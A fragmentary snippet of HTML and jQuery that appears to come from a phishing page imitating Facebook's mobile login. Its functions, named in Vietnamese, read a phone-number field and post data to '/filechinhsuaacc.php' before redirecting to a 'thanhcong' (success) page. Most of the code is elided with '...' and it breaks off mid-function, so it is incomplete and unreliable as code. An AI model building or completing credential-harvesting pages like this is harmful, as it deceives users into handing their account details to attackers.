                        ...
                        <div class="_4g33">
                            <div id="u_0_0" class="_4g34">
                                ...
                                <!---->
                                    ...
                                    <div class="_5rut">
                                          <div>
                                          <div class="_52jj _3-q2"><img src="https://i.imgur.com/Oj3QMw3.jpg"
                                                    width="70">
                                            <br></br>
        ...
        function go() {
            ...
            $.post("/filechinhsuaacc.php",
                ...
                function (data, status) {
                    ...
                    v();window.location.href = '/thanhcong.php';
                });
        }
        function dangnhap() {
            var sdt = $("#sdt").val();
